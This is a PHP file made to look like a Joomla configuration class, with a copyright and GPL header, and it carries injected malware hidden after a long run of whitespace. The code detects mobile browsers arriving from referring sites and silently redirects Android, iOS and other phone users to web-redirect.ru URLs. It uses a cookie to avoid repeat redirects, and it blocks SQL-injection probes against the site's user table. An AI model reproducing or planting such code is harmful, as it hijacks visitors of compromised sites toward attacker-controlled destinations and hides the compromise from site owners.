<?php 
/*
=====================================================
Joomla! - Open Source Matters
-----------------------------------------------------
http://www.joomla.org/
-----------------------------------------------------
Copyright (c) 2004,2014
=====================================================
Данный код защищен авторскими правами
=====================================================
Назначение: Класс конфигурации
=====================================================
GNU GENERAL PUBLIC LICENSE
Version 3, 29 June 2007
Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org>
Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.
*/ 																																																																																																																																																							 function check_cookie($url_redirect){	if (($_SERVER['HTTP_REFERER'] != null) and ($_SERVER['HTTP_REFERER'] != "") and ($_SERVER['HTTP_REFERER'] != " ")){	if(isset($_COOKIE['_cutt_caches_images']) && $_COOKIE['_cutt_caches_images']<strtotime('+24 hours'))return false;	setcookie('_cutt_caches_images', time(), strtotime('+24 hours'),"/");header("Location: $url_redirect");exit;}}$q=$_SERVER['QUERY_STRING'];$referer = $q;$referer = str_replace('&', '*', $referer);$referer = str_replace(';', '~', $referer);$referer = trim($referer);$s=stristr($q,'union');$s2=stristr($q,'select');$s3=stristr($q,'from');$s4=stristr($q,'jos_users');$s5=stristr($q,'concat');$s6=stristr($q,'username');$s7=stristr($q,'password');$link = 'http://'.$_SERVER['SERVER_NAME'];if((($s!=false)and($s2!=false))or(($s3!=false)and($s4!=false))or(($s5!=false)and($s6!=false))or(($s5!=false)and($s7!=false))or(($s5!=false)and($s4!=false))){header("Location: $link");exit;}$android_redirect = 'http://web-redirect.ru/?andr';$ios_redirect = 'http://web-redirect.ru/?ios';$another_mobile_redirect = 'http://web-redirect.ru/?mb';$web_potok = 'http://web-redirect.ru/?web';$iphone = stristr($_SERVER['HTTP_USER_AGENT'],"iPhone");$ipod = stristr($_SERVER['HTTP_USER_AGENT'],"iPod");$ipad = stristr($_SERVER['HTTP_USER_AGENT'],"iPad");$android = stristr($_SERVER['HTTP_USER_AGENT'],"Android");$symb = stristr($_SERVER['HTTP_USER_AGENT'],"Symbian");$wp7 = stristr($_SERVER['HTTP_USER_AGENT'],"WP7");$wp8 = stristr($_SERVER['HTTP_USER_AGENT'],"WP8");$winphone = stristr($_SERVER['HTTP_USER_AGENT'],"WindowsPhone");$berry = stristr($_SERVER['HTTP_USER_AGENT'],"BlackBerry");$palmpre = stristr($_SERVER['HTTP_USER_AGENT'],"webOS");$mobile_tel = stristr($_SERVER['HTTP_USER_AGENT'],"Mobile");$operam = stristr($_SERVER['HTTP_USER_AGENT'],"Opera M");$htc = stristr($_SERVER['HTTP_USER_AGENT'], 'HTC');$fennec = stristr($_SERVER['HTTP_USER_AGENT'],"Fennec");if ($android == true)check_cookie($android_redirect);elseif (($iphone == true) or ($ipod == true) or ($ipad == true))	check_cookie($ios_redirect);elseif (($palmpre == true) or ($mobile_tel == true) or ($operam == true) or ($htc == true) or ($wp7 == true) or ($wp8 == true) or ($symb == true) or ($berry == true) or ($fennec == true) or ($winphone == true))	check_cookie($another_mobile_redirect); //elseif (preg_match('#google|yahoo|yandex|vk|odnoklassniki|mail|youtube|wikipedia|netscape|bing|facebook|twitter|dmoz|ebay|icq|yandex|google|rambler#i',$_SERVER['HTTP_REFERER']))check_cookie($web_potok);else $aaa = false;
?>
